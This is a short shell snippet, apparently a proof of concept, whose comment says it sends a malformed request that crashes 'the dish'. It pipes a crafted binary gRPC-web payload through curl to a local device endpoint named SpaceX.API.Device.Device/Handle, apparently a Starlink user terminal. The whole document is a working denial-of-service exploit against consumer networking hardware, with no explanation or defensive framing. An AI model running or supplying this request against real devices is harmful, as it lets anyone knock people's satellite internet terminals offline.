# Send a malformed request, causing the dish to crash

printf '\x00\x00\x00\x00\x03\xea>\x00' \
| curl 'http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle' \
-X POST \
-H 'Accept: */*' \
-H 'Accept-Language: en-GB,en;q=0.5' \
-H 'content-type: application/grpc-web+proto' \
-H 'x-grpc-web: 1' \
--data-binary @- -v | xxd
